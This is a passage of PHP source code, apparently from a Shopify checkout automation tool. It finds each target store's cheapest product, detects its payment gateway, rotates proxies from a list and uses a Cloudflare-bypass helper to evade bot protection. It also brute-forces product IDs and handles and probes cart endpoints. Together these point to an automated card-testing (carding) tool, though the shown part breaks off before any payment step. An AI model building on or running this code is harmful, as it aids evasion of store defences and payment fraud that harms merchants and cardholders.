    // Use CF bypass with faster timeouts (reduced to 2s total for HYPER-speed)
    $strategiesAttempted++;
    [$directBody, $directCode] = http_get_with_cf_bypass($baseUrl.'/products.json', $cookieFile, $directHeaders, 1, 2, 1);
    if ($directCode >= 200 && $directCode < 300 && !empty($directBody)) {
        $js = json_decode($directBody, true);
        if (is_array($js) && isset($js['products']) && is_array($js['products']) && count($js['products']) > 0) {
            // Cache successful result
            $GLOBALS['__products_cache'][$cacheKey] = ['data' => $js, 'time' => time()];
            return $js;
        }
    }
    
    // Early exit if site is actively blocking (403, 429, or multiple 404s)
    if ($directCode == 403 || $directCode == 429 || $directCode == 503) {
        throw new Exception('Product data not available');
    }

    // Strategy 1: Try all primary endpoints in parallel (fastest) - OPTIMIZED timeouts
    // Check if we should continue (limit strategies for speed)
    if ($strategiesAttempted >= $maxStrategies) {
        throw new Exception('Product data not available');
    }
    $strategiesAttempted++;
    
    // EXPANDED: Added more endpoint variations from working implementations
    $candidates = [
        $baseUrl.'/products.json?limit=250',
        $baseUrl.'/products.json',
        $baseUrl.'/collections/all/products.json?limit=250',
        $baseUrl.'/collections/all/products.json',
        $baseUrl.'/products.json?limit=50',
        $baseUrl.'/products.json?limit=100',
    ];

    // OPTIMIZED: Faster timeouts - 2s total, 1s connect for HYPER-speed
    $multiResults = multi_http_get_with_proxy($candidates, $cookieFile, $directHeaders, 2, 1);
    foreach ($candidates as $u) {
        if (!isset($multiResults[$u])) continue;
        [$body, $code] = $multiResults[$u];
        if ($code >= 200 && $code < 300 && !empty($body)) {
            $js = json_decode($body, true);
            if (is_array($js) && isset($js['products']) && is_array($js['products']) && count($js['products']) > 0) {
                // Cache successful result
                $GLOBALS['__products_cache'][$cacheKey] = ['data' => $js, 'time' => time()];
                return $js;
            }
        }
    }

    // Strategy 2: Try collections endpoint (fetch max 2 collections in parallel for speed) - OPTIMIZED
    // Check if we should continue (limit strategies for speed)
    if ($strategiesAttempted >= $maxStrategies) {
        throw new Exception('Product data not available');
    }
    $strategiesAttempted++;
    
    [$colBody, $colCode] = http_get_with_cf_bypass($baseUrl.'/collections.json?limit=10', $cookieFile, $directHeaders, 1, 2, 1);
    if ($colCode >= 200 && $colCode < 300 && !empty($colBody)) {
        $col = json_decode($colBody, true);
        if (is_array($col) && isset($col['collections']) && is_array($col['collections']) && count($col['collections']) > 0) {
            // Fetch first 2 collections in parallel
            $collectionUrls = [];
            $limit = min(2, count($col['collections']));
            for ($i = 0; $i < $limit; $i++) {
                if (isset($col['collections'][$i]['handle'])) {
                    $handle = $col['collections'][$i]['handle'];
                    $collectionUrls[] = $baseUrl.'/collections/'.$handle.'/products.json?limit=250';
                }
            }
            
            if (!empty($collectionUrls)) {
                // OPTIMIZED: Reduced timeout to 2s total, 1s connect for HYPER-speed
                $colResults = multi_http_get_with_proxy($collectionUrls, $cookieFile, $directHeaders, 2, 1);
                $products = [];
                foreach ($colResults as $url => [$pb, $pc]) {
                    if ($pc >= 200 && $pc < 300 && !empty($pb)) {
                        $pj = json_decode($pb, true);
                        if (is_array($pj) && isset($pj['products']) && is_array($pj['products'])) {
                            $products = array_merge($products, $pj['products']);
                            if (count($products) > 0) {
                                // Early exit when we have products
                                $result = ['products' => $products];
                                $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                                return $result;
                            }
                        }
                    }
                }
            }
        }
    }

    // Strategy 3: Try sitemap (faster with parallel requests) - OPTIMIZED
    // Check if we should continue (limit strategies for speed)
    if ($strategiesAttempted >= $maxStrategies) {
        throw new Exception('Product data not available');
    }
    $strategiesAttempted++;
    
    $sitemapCandidates = [
        $baseUrl.'/sitemap_products_1.xml',
        $baseUrl.'/sitemap.xml'
    ];
    // OPTIMIZED: Reduced to 2s total, 1s connect for HYPER-speed
    $sitemapHeaders = array_merge($directHeaders, ['Accept: application/xml,text/xml;q=0.9,*/*;q=0.1']);
    $sitemapResults = multi_http_get_with_proxy($sitemapCandidates, $cookieFile, $sitemapHeaders, 2, 1);
    foreach ($sitemapCandidates as $sm) {
        if (!isset($sitemapResults[$sm])) continue;
        [$sb, $sc] = $sitemapResults[$sm];
        if ($sc >= 200 && $sc < 300 && is_string($sb) && (stripos($sb, '<urlset') !== false || stripos($sb, '<sitemapindex') !== false)) {
            $handles = extract_product_handles_from_sitemap($sb);
            if (!empty($handles)) {
                $collected = fetch_products_by_handles($baseUrl, $handles, $cookieFile, 2); // ULTRA-FAST: Reduced from 3 to 2
                if (!empty($collected)) {
                    $result = ['products' => $collected];
                    $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                    return $result;
                }
            }
        }
    }

    // Skip remaining slow strategies if limit reached - HYPER-SPEED optimization
    // Strategies 4+ are slower and less reliable, skip them if we've hit the limit
    if ($strategiesAttempted >= $maxStrategies) {
        throw new Exception('Product data not available');
    }
    
    // Strategy 4: HTML scraping (last resort) - OPTIMIZED
    $strategiesAttempted++;
    $htmlUrls = [
        $baseUrl.'/',
        $baseUrl.'/collections/all'
    ];
    // OPTIMIZED: Reduced to 3s total, 1s connect for HYPER-speed
    $htmlHeaders = array_merge($directHeaders, ['Accept: text/html,application/xhtml+xml']);
    $htmlResults = multi_http_get_with_proxy($htmlUrls, $cookieFile, $htmlHeaders, 3, 1);
    $handles = [];
    $foundHtml = '';
    foreach ($htmlResults as $url => [$html, $code]) {
        if ($code >= 200 && $code < 300 && !empty($html)) {
            if (empty($foundHtml)) $foundHtml = $html; // Keep first successful HTML for extraction
            $handles = array_merge($handles, extract_product_handles_from_html($html));
            if (count($handles) > 5) break; // Stop early if we have enough
        }
    }
    
    if (!empty($handles)) {
        $collected = fetch_products_by_handles($baseUrl, $handles, $cookieFile, 2); // ULTRA-FAST: Reduced from 3 to 2
        if (!empty($collected)) {
            $result = ['products' => $collected];
            $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
            return $result;
        }
    }
    
    // Strategy 5: Try to extract product IDs directly from HTML as last resort
    if (!empty($foundHtml)) {
        // Strategy 5a: Try to find Shopify metaobject or product data in script tags (fastest HTML method)
        if (preg_match('/<script[^>]*type=["\']application\/json["\'][^>]*>(.+?)<\/script>/is', $foundHtml, $scriptMatch)) {
            $jsonData = json_decode($scriptMatch[1], true);
            if (is_array($jsonData)) {
                // Look for product data in the JSON
                if (isset($jsonData['product']['id']) || isset($jsonData['products'][0]['id'])) {
                    $productData = $jsonData['product'] ?? $jsonData['products'][0];
                    $result = ['products' => [$productData]];
                    $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                    return $result;
                }
            }
        }
        
        // Strategy 5b: Look for product variant IDs in the HTML (common in Shopify themes)
        if (preg_match('/gid:\/\/shopify\/ProductVariant\/(\d+)/', $foundHtml, $m)) {
            $variantId = $m[1];
            // Try to fetch this product's JSON with CF bypass
            if (preg_match('/\/products\/([a-z0-9\-_]+)/', $foundHtml, $pm)) {
                $handle = $pm[1];
                [$pBody, $pCode] = http_get_with_cf_bypass($baseUrl.'/products/'.$handle.'.json', $cookieFile, $directHeaders, 1, 3, 1);
                if ($pCode >= 200 && $pCode < 300 && !empty($pBody)) {
                    $pj = json_decode($pBody, true);
                    if (is_array($pj) && isset($pj['product'])) {
                        $result = ['products' => [$pj['product']]];
                        $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                        return $result;
                    }
                }
            }
        }
        
        // Strategy 5c: Look for data-product-id or data-variant-id (most common patterns, limit to 1 attempt)
        $quickPatterns = [
            '/data-product-id=["\'](\d{8,})["\']/',  // data-product-id="12345678"
            '/data-variant-id=["\'](\d{8,})["\']/',  // data-variant-id="12345678"
        ];
        
        foreach ($quickPatterns as $pattern) {
            if (preg_match($pattern, $foundHtml, $match)) {
                $possibleId = trim((string)$match[1]);
                if (strlen($possibleId) >= 8 && strlen($possibleId) <= 20) {
                    // Try only the first endpoint with very short timeout
                    [$body, $code] = http_get_with_cf_bypass($baseUrl.'/products/variant.js?id='.$possibleId, $cookieFile, $directHeaders, 1, 3, 1);
                    if ($code >= 200 && $code < 300 && !empty($body)) {
                        $payload = json_decode($body, true);
                        if (is_array($payload)) {
                            if (isset($payload['variant'])) $payload = $payload['variant'];
                            $variantProduct = build_product_from_variant_payload($payload);
                            if (!empty($variantProduct)) {
                                $result = ['products' => [$variantProduct]];
                                $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                                return $result;
                            }
                        }
                    }
                    break; // Only try first match to save time
                }
            }
        }
    }
    
    // Strategy 6: Try to access the cart.js API to see if there are existing items (with CF bypass)
    [$cartBody, $cartCode] = http_get_with_cf_bypass($baseUrl.'/cart.js', $cookieFile, $directHeaders, 1, 3, 1);
    if ($cartCode >= 200 && $cartCode < 300 && !empty($cartBody)) {
        $cartData = json_decode($cartBody, true);
        if (is_array($cartData) && !empty($cartData['items'])) {
            // Extract product info from cart items
            $firstItem = $cartData['items'][0];
            if (isset($firstItem['variant_id']) || isset($firstItem['id'])) {
                $variantId = $firstItem['variant_id'] ?? $firstItem['id'];
                $result = ['products' => [[
                    'id' => (int)($firstItem['product_id'] ?? $variantId),
                    'title' => $firstItem['product_title'] ?? 'Product',
                    'handle' => $firstItem['handle'] ?? 'product',
                    'variants' => [[
                        'id' => (int)$variantId,
                        'price' => number_format(($firstItem['price'] ?? 1000) / 100, 2),
                        'available' => true
                    ]],
                    'price' => number_format(($firstItem['price'] ?? 1000) / 100, 2)
                ]]];
                $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                return $result;
            }
        }
    }
    
    // Strategy 7: Try Shopify's storefront API (if accessible) - SKIPPED for speed (rarely works without auth)
    
    // Strategy 8: Try common/bruteforce product IDs (last resort for heavily protected stores)
    // EXPANDED: Added more common ID ranges from working implementations
    $commonIds = [
        40000000000, 41000000000, 42000000000, // Newer stores (most common)
        30000000000, 35000000000, // Older stores
        20000000000, 25000000000, // Even older stores
        50000000000, 51000000000, // Very new stores
        10000000000, 15000000000, // Legacy stores
    ];
    
    // Try up to 6 most common IDs in parallel with very short timeout
    $variantUrls = [];
    $maxIds = min(6, count($commonIds));
    for ($i = 0; $i < $maxIds; $i++) {
        $variantUrls[] = $baseUrl.'/products/variant.js?id='.$commonIds[$i];
    }
    $variantResults = multi_http_get_with_proxy($variantUrls, $cookieFile, $directHeaders, 8, 5); // OPTIMIZED: 8s total, 5s connect
    foreach ($variantUrls as $url) {
        if (!isset($variantResults[$url])) continue;
        [$body, $code] = $variantResults[$url];
        if ($code >= 200 && $code < 300 && !empty($body)) {
            $payload = json_decode($body, true);
            if (is_array($payload)) {
                if (isset($payload['variant'])) $payload = $payload['variant'];
                $variantProduct = build_product_from_variant_payload($payload);
                if (!empty($variantProduct)) {
                    $result = ['products' => [$variantProduct]];
                    $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                    return $result;
                }
            }
        }
    }
    
    // Strategy 9: Try common product handles (bruteforce common Shopify product names)
    // EXPANDED: Added more common handles from working implementations
    $commonHandles = [
        'gift-card', 'test-product', 'sample', 'product', 'item',
        't-shirt', 'tshirt', 'default', 'basic-tee', 'basic-product',
        'demo', 'example', 'new-product', 'featured-product',
        'test', 'test-item', 'sample-product', 'demo-product',
        'product-1', 'item-1', 'test-1', 'sample-1',
        'default-product', 'basic-item', 'standard-product',
        'shop', 'store', 'buy', 'purchase', 'order',
        'free-shipping', 'sale', 'special', 'limited',
        'new', 'featured', 'popular', 'bestseller',
        'premium', 'standard', 'basic', 'starter'
    ];
    
    // Try up to 8 most common handles in parallel (balanced speed vs coverage)
    $handleUrls = [];
    $maxHandles = min(8, count($commonHandles));
    for ($i = 0; $i < $maxHandles; $i++) {
        $handleUrls[] = $baseUrl.'/products/'.$commonHandles[$i].'.json';
    }
    
    if (!empty($handleUrls)) {
        $handleResults = multi_http_get_with_proxy($handleUrls, $cookieFile, $directHeaders, 8, 5); // OPTIMIZED: 8s total, 5s connect
        foreach ($handleResults as $url => [$hBody, $hCode]) {
            if ($hCode >= 200 && $hCode < 300 && !empty($hBody)) {
                $hj = json_decode($hBody, true);
                if (is_array($hj) && isset($hj['product'])) {
                    $result = ['products' => [$hj['product']]];
                    $GLOBALS['__products_cache'][$cacheKey] = ['data' => $result, 'time' => time()];
                    return $result;
                }
            }
        }
    }
    
    // Strategy 10: Try RSS feed (Shopify blogs often have product feeds) - SKIPPED for speed
    // RSS feeds are rarely used and slow to check, skip to save time
    
    // Final fallback: no safe product data discovered
    throw new Exception('Product data not available');
}

// Extract product handles from sitemap XML content
function extract_product_handles_from_sitemap(string $xml): array {
    $handles = [];
    // Product URLs usually contain /products/<handle>
    if (preg_match_all('#/products/([a-z0-9\-_%]+)/?#i', $xml, $m)) {
        $seen = [];
        foreach ($m[1] as $h) {
            $h = trim($h);
            if ($h !== '' && !isset($seen[$h])) { $handles[] = $h; $seen[$h] = true; }
        }
    }
    // If sitemap index, try to find product sitemap links (but parsing them here is heavy; the first regex often catches URLs too)
    return array_slice($handles, 0, 20);
}

// Extract product handles from HTML by scanning anchor hrefs
function extract_product_handles_from_html(?string $html): array {
    if (!$html) return [];
    $handles = [];
    if (preg_match_all('#href=["\'](/products/([a-z0-9\-_%]+))["\']#i', $html, $m)) {
        $seen = [];
        foreach ($m[2] as $h) {
            $h = trim($h);
            if ($h !== '' && !isset($seen[$h])) { $handles[] = $h; $seen[$h] = true; }
        }
    }
    return array_slice($handles, 0, 30);
}

/**
 * Extract product variant ID from checkout page HTML
 * This allows us to proceed even when product discovery fails
 */
function extract_product_from_checkout_page(?string $html): ?array {
    if (!$html) return null;
    
    // Try multiple patterns to find product variant ID
    $patterns = [
        '/gid:\/\/shopify\/ProductVariant\/(\d+)/',
        '/"variantId":\s*"(\d+)"/',
        '/"variantId":\s*(\d+)/',
        '/variant_id["\']?\s*[:=]\s*["\']?(\d+)/',
        '/data-variant-id=["\'](\d+)["\']/',
        '/variant["\']?\s*:\s*["\']?(\d+)/',
        '/variantId["\']?\s*:\s*["\']?(\d+)/',
        '/"id":\s*"gid:\/\/shopify\/ProductVariant\/(\d+)"/',
    ];
    
    $variantId = null;
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $html, $matches)) {
            $candidate = $matches[1];
            if (!empty($candidate) && is_numeric($candidate)) {
                $variantId = $candidate;
                break;
            }
        }
    }
    
    if (empty($variantId)) {
        return null;
    }
    
    // Try to extract price from checkout page (multiple patterns)
    $price = null;
    $pricePatterns = [
        '/"price":\s*"([^"]+)"/',
        '/"price":\s*([\d.]+)/',
        '/price["\']?\s*[:=]\s*["\']?([\d.]+)/',
        '/"totalPrice":\s*"([^"]+)"/',
        '/"totalPrice":\s*([\d.]+)/',
        '/total_price["\']?\s*[:=]\s*["\']?([\d.]+)/',
    ];
    
    foreach ($pricePatterns as $pattern) {
        if (preg_match($pattern, $html, $priceMatch)) {
            $price = $priceMatch[1];
            break;
        }
    }
    
    // Try to extract product title
    $title = null;
    $titlePatterns = [
        '/"title":\s*"([^"]+)"/',
        '/"productTitle":\s*"([^"]+)"/',
        '/"name":\s*"([^"]+)"/',
        '/<title>([^<]+)<\/title>/i',
        '/<h[1-6][^>]*>([^<]+)<\/h[1-6]>/i',
    ];
    
    foreach ($titlePatterns as $pattern) {
        if (preg_match($pattern, $html, $titleMatch)) {
            $title = trim($titleMatch[1]);
            if (!empty($title) && strlen($title) > 3) {
                break;
            }
        }
    }
    
    return [
        'id' => $variantId,
        'price' => $price ?: '0.00',
        'title' => $title ?: 'Product',
        'variant_id' => $variantId
    ];
}

/**
 * Check if a URL is a Shopify checkout URL
 */
function is_checkout_url(string $url): bool {
    return (bool) preg_match('~/checkouts/(cn/)?[^/?#]+~i', $url);
}

/**
 * Extract checkout token from checkout URL
 */
function extract_checkout_token_from_url(string $url): ?string {
    if (preg_match('~/checkouts/cn/([^/?#]+)~i', $url, $matches)) {
        return $matches[1];
    }
    if (preg_match('~/checkouts/([^/?#]+)~i', $url, $matches)) {
        return $matches[1];
    }
    return null;
}

// Fetch product JSONs for a set of handles and collect as products
function fetch_products_by_handles(string $baseUrl, array $handles, ?string $cookieFile = null, int $limit = 5): array {
    $products = [];
    if ($limit <= 0 || empty($handles)) return $products;
    
    // Build up to $limit product JSON URLs
    $urls = [];
    foreach ($handles as $h) {
        $urls[] = $baseUrl.'/products/'.$h.'.json';
        if (count($urls) >= $limit) break;
    }
    if (empty($urls)) return $products;

    // Fetch in parallel with optimized timeouts (reduced timeout from 5 to 3, batch size 10 for better parallelism)
    $results = multi_http_get_with_proxy_chunked($urls, $cookieFile, [], 3, 2, 10);
    foreach ($urls as $u) {
        if (!isset($results[$u])) continue;
        [$body, $code] = $results[$u];
        if ($code >= 200 && $code < 300 && !empty($body)) {
            $pj = json_decode($body, true);
            if (is_array($pj) && isset($pj['product']) && is_array($pj['product'])) {
                $products[] = $pj['product'];
            }
        }
    }
    return $products;
}

/**
 * Normalize raw Shopify price formats (cents or decimal) into a standard string.
 */
function normalize_shopify_price($rawValue): ?string {
    if ($rawValue === null) {
        return null;
    }
    if (is_array($rawValue)) {
        $rawValue = reset($rawValue);
    }
    $hasDecimal = false;
    if (is_string($rawValue)) {
        $rawValue = trim(str_replace(',', '.', $rawValue));
        if ($rawValue === '') {
            return null;
        }
        $rawValue = preg_replace('/[^0-9\.\-]/', '', $rawValue);
        if ($rawValue === '' || !is_numeric($rawValue)) {
            return null;
        }
        $hasDecimal = strpos($rawValue, '.') !== false;
        $numeric = (float)$rawValue;
    } elseif (is_numeric($rawValue)) {
        $numeric = (float)$rawValue;
        $hasDecimal = fmod($numeric, 1.0) !== 0.0;
    } else {
        return null;
    }
    if (!$hasDecimal && $numeric >= 100) {
        $price = $numeric / 100;
    } else {
        $price = $numeric;
    }
    if ($price < 0.01) {
        return null;
    }
    return number_format($price, 2, '.', '');
}

/**
 * Convert variant payloads gathered from Shopify endpoints into the product format expected downstream.
 */
function build_product_from_variant_payload(array $variant): ?array {
    $variantId = $variant['id'] ?? $variant['variant_id'] ?? $variant['variantId'] ?? null;
    if ($variantId === null) {
        return null;
    }
    $priceCandidate = $variant['price'] ?? $variant['final_price'] ?? $variant['amount'] ?? $variant['original_price'] ?? null;
    $normalizedPrice = normalize_shopify_price($priceCandidate);
    if ($normalizedPrice === null) {
        return null;
    }
    $productId = $variant['product_id'] ?? $variant['productId'] ?? $variantId;
    $title = $variant['product_title'] ?? $variant['title'] ?? $variant['name'] ?? ('Variant '.$variantId);
    $handle = $variant['product_handle'] ?? $variant['handle'] ?? ('variant-'.$variantId);
    $availabilityRaw = $variant['available'] ?? ($variant['inventory_quantity'] ?? null);
    $available = true;
    if (is_bool($availabilityRaw)) {
        $available = $availabilityRaw;
    } elseif (is_numeric($availabilityRaw)) {
        $available = ((int)$availabilityRaw) > 0;
    } elseif (is_string($availabilityRaw)) {
        $available = !in_array(strtolower($availabilityRaw), ['false', '0', 'no'], true);
    }
    return [
        'id' => (int)$productId,
        'title' => $title,
        'handle' => $handle,
        'variants' => [[
            'id' => (int)$variantId,
            'price' => $normalizedPrice,
            'available' => $available
        ]],
        'price' => $normalizedPrice
    ];
}

/**
 * Attempt to fetch a product definition using only a variant ID.
 */
function fetch_product_using_variant_id(string $baseUrl, $variantId, ?string $cookieFile = null): ?array {
    $variantId = trim((string)$variantId);
    if ($variantId === '') {
        return null;
    }
    $variantEndpoints = [
        $baseUrl.'/products/variant.js?id='.$variantId,
        $baseUrl.'/products/variant.json?id='.$variantId,
        $baseUrl.'/variants/'.$variantId.'.json',
    ];
    foreach ($variantEndpoints as $endpoint) {
        [$body, $code] = http_get_with_cf_bypass($endpoint, $cookieFile, ['Accept: application/json'], 1, 3, 1);
        if ($code >= 200 && $code < 300 && !empty($body)) {
            $payload = json_decode($body, true);
            if (!is_array($payload)) {
                continue;
            }
            if (isset($payload['variant'])) {
                $payload = $payload['variant'];
            }
            $product = build_product_from_variant_payload($payload);
            if (!empty($product)) {
                return $product;
            }
        }
    }
    return fetch_product_via_cart_probe($baseUrl, $variantId, $cookieFile);
}

/**
 * Last-resort method: probe cart/add.js to capture real variant pricing.
 */
function fetch_product_via_cart_probe(string $baseUrl, string $variantId, ?string $cookieFile = null): ?array {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $baseUrl.'/cart/add.js');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['id' => $variantId, 'quantity' => 1]));
    if ($cookieFile) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    }
    apply_common_timeouts($ch);
    $referer = rtrim($baseUrl, '/').'/';
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: '.$baseUrl,
        'Referer: '.$referer,
        'User-Agent: '.flow_user_agent(),
        'X-Requested-With: XMLHttpRequest'
    ]);
    apply_proxy_if_used($ch, $baseUrl);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code < 200 || $code >= 300 || empty($body)) {
        return null;
    }
    $payload = json_decode($body, true);
    if (!is_array($payload)) {
        return null;
    }
    if (isset($payload['items']) && is_array($payload['items']) && count($payload['items']) > 0) {
        $payload = $payload['items'][0];
    }
    $variantPayload = [
        'id' => $payload['variant_id'] ?? $payload['id'] ?? $variantId,
        'variant_id' => $payload['variant_id'] ?? $payload['id'] ?? $variantId,
        'price' => $payload['price'] ?? $payload['final_price'] ?? $payload['line_price'] ?? null,
        'product_id' => $payload['product_id'] ?? ($payload['id'] ?? $variantId),
        'product_title' => $payload['product_title'] ?? $payload['title'] ?? ($payload['name'] ?? 'Variant '.$variantId),
        'name' => $payload['title'] ?? ($payload['product_title'] ?? 'Variant '.$variantId),
        'available' => true,
    ];
    return build_product_from_variant_payload($variantPayload);
}

$site1_raw = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$checkoutUrlParam = filter_input(INPUT_GET, 'checkoutUrl', FILTER_SANITIZE_URL);

$isCheckoutUrl = !empty($site1_raw) && is_checkout_url($site1_raw);
$checkoutToken = null;
$directCheckoutUrl = null;

// Check if user provided a separate checkout URL parameter (for sites with blocked product endpoints)
if (!empty($checkoutUrlParam) && is_checkout_url($checkoutUrlParam)) {
    $checkoutToken = extract_checkout_token_from_url($checkoutUrlParam);
    $directCheckoutUrl = $checkoutUrlParam;
    $isCheckoutUrl = true;
    // Extract base URL from checkout URL for proxy testing
    $parsed = parse_url($checkoutUrlParam);
    if (!empty($site1_raw)) {
        // Use the site parameter for base URL
        $host = parse_url($site1_raw, PHP_URL_HOST);
        if (empty($host)) {
            // site1_raw might not have scheme, try to parse as-is
            $host = $site1_raw;
        }
        $site1 = 'https://' . $host;
    } else {
        // Fallback to checkout URL's host
        $site1 = $parsed['scheme'] . '://' . $parsed['host'];
    }
} elseif ($isCheckoutUrl) {
    // If it's a checkout URL in site parameter, extract token and preserve full URL
    $checkoutToken = extract_checkout_token_from_url($site1_raw);
    $directCheckoutUrl = $site1_raw;
    // Extract base URL from checkout URL for proxy testing
    $parsed = parse_url($site1_raw);
    $site1 = $parsed['scheme'] . '://' . $parsed['host'];
} else {
    // Normal flow: extract host only
    $host = parse_url($site1_raw, PHP_URL_HOST);
    if (empty($host)) {
        // site1_raw might not have scheme, try to parse as-is
        $host = $site1_raw;
    }
    $site1 = 'https://' . $host;
}

$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    $err = 'Invalid URL';
    $result_data = [
        'Response' => $err,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}

// If a proxy was selected (user or auto), verify it can reach the target site with proper HTTPS support
if ($proxy_used) {
    // Build full proxy string with credentials for testing
    $fullProxy = ($proxy_type ? ($proxy_type.'://') : '');
    if ($proxy_user !== '' && $proxy_pass !== '') {
        $fullProxy .= $proxy_user . ':' . $proxy_pass . '@';
    }
    $fullProxy .= $proxy_ip . ':' . $proxy_port;
    
    $maxRetries = 3;
    $retryAttempt = 0;
    $proxyWorks = false;
    
    while (!$proxyWorks && $retryAttempt < $maxRetries) {
        // Test if proxy can reach the target site (HTTPS support required for Shopify)
        if (proxy_can_reach_url($fullProxy, $site1, 3)) {
            $proxyWorks = true;
            break;
        }
        
        $retryAttempt++;
        
        // If this proxy failed and was auto-picked, try another from the pool
        if (!isset($_GET['proxy']) || empty($_GET['proxy'])) {
            $alt = select_working_proxy_for_url('ProxyList.txt', $site1, 2);
            if ($alt) {
                // Re-parse alt proxy
                $ptype = 'http';
                $addr = $alt;
                if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $alt, $m)) {
                    $ptype = strtolower($m[1]);
                    $addr = $m[2];
                }
                $parts = explode(':', $addr);
                if (count($parts) >= 2) {
                    $proxy_ip = $parts[0];
                    $proxy_port = $parts[1];
                    if (count($parts) >= 4) { $proxy_user = $parts[2]; $proxy_pass = $parts[3]; }
                    $proxy_type = $ptype;
                    $proxy_used = true;
                    $proxy_status = 'Live';
                    $fullProxy = ($proxy_type ? ($proxy_type.'://') : '') . $proxy_ip . ':' . $proxy_port;
                    // Continue loop to test this new proxy
                    continue;
                }
            }
            // No more proxies available
            break;
        } else {
            // User provided proxy failed - don't retry with auto-selection
            break;
        }
    }
    
    // Final check: did we find a working proxy?
    if (!$proxyWorks) {
        if ((!isset($_GET['proxy']) || empty($_GET['proxy'])) && !$require_proxy) {
            // Fallback to direct connection
            $proxy_used = false;
        } else {
            // Either user provided proxy explicitly (and it failed), or requireProxy=1
            $msg = (!isset($_GET['proxy']) || empty($_GET['proxy']))
                ? 'No proxy can reach the target site and requireProxy=1. Update ProxyList.txt or use ?noproxy to bypass.'
                : 'Provided proxy cannot reach the target site (CONNECT aborted or blocked). The proxy may not support HTTPS tunneling. Use a different proxy or ?noproxy.';
            send_final_response([
                'Response' => $msg,
                'ProxyStatus' => 'Dead for this site',
                'ProxyIP' => $proxy_ip . ':' . $proxy_port,
                'TriedProxies' => $retryAttempt
            ], false, $proxy_ip, $proxy_port);
        }
    }
}

    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
    
    // Initialize product variables
    $minPriceProductId = null;
    $minPrice = null;
    $productTitle = null;
    
    // If we have a direct checkout URL, try to extract product info from it
    if ($isCheckoutUrl && $directCheckoutUrl) {
        try {
            [$checkoutBody, $checkoutCode] = http_get_with_proxy($directCheckoutUrl, 'cookie.txt', ['Accept: text/html'], 3, 1);
            if ($checkoutCode >= 200 && $checkoutCode < 300 && !empty($checkoutBody)) {
                // Extract product info from checkout page
                $productInfo = extract_product_from_checkout_page($checkoutBody);
                if ($productInfo) {
                    $minPriceProductId = $productInfo['id'];
                    $minPrice = $productInfo['price'];
                    $productTitle = $productInfo['title'];
                }
                
                // Also do gateway detection from checkout page
                $gatewayCandidates = GatewayDetector::detectAll($checkoutBody, $directCheckoutUrl, []);
                if (!empty($gatewayCandidates) && $gatewayCandidates[0]['id'] !== 'unknown') {
                    $GLOBALS['__gateway_primary'] = $gatewayCandidates[0];
                    $GLOBALS['__gateway_candidates'] = $gatewayCandidates;
                }
            }
        } catch (Exception $e) {
            // Continue to try product discovery
        }
    }
    
    // Early gateway detection: Try to detect gateway from homepage before product discovery
    // This ensures gateway detection works even if product discovery fails
    if (!$isCheckoutUrl || empty($minPriceProductId)) {
        try {
            [$homepageBody, $homepageCode] = http_get_with_proxy($site2, 'cookie.txt', ['Accept: text/html'], 3, 1);
            if ($homepageCode >= 200 && $homepageCode < 300 && !empty($homepageBody)) {
                $gatewayCandidates = GatewayDetector::detectAll($homepageBody, $site2, []);
                if (!empty($gatewayCandidates) && $gatewayCandidates[0]['id'] !== 'unknown') {
                    $GLOBALS['__gateway_primary'] = $gatewayCandidates[0];
                    $GLOBALS['__gateway_candidates'] = $gatewayCandidates;
                }
            }
        } catch (Exception $e) {
            // Ignore gateway detection errors, continue with product discovery
        }
    }
    
    // Try product discovery if we don't have product info yet
    if (empty($minPriceProductId)) {
        try {
            $productsData = fetchProductsJson($site2, 'cookie.txt');
            $r1 = json_encode($productsData);
            $productDetails = getMinimumPriceProductDetails($r1);
            $minPriceProductId = $productDetails['id'];
            $minPrice = $productDetails['price'];
            $productTitle = $productDetails['title'];
        } catch (Exception $e) {
            // If product discovery fails and we have a checkout URL, try to extract from checkout page
            if ($isCheckoutUrl && $directCheckoutUrl) {
                try {
                    [$checkoutBody, $checkoutCode] = http_get_with_proxy($directCheckoutUrl, 'cookie.txt', ['Accept: text/html'], 3, 1);
                    if ($checkoutCode >= 200 && $checkoutCode < 300 && !empty($checkoutBody)) {
                        $productInfo = extract_product_from_checkout_page($checkoutBody);
                        if ($productInfo) {
                            $minPriceProductId = $productInfo['id'];
                            $minPrice = $productInfo['price'];
                            $productTitle = $productInfo['title'];
                        }
                    }
                } catch (Exception $e2) {
                    // Fall through to error response
                }
            }
            
            // If we still don't have product info, return error
            if (empty($minPriceProductId)) {
                $err = $e->getMessage();
                $result_data = [
                    'Response' => $err,
                ];
                // Gateway detection already ran above, so it will be included in the response
                send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
            }
        }
    }

// If we have a direct checkout URL, we can skip product discovery requirement
if (empty($minPriceProductId) && (!$isCheckoutUrl || !$directCheckoutUrl)) {
    $err = 'Product id is empty';
    $result_data = [
        'Response' => $err,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
    exit;
}

$urlbase = $site1;
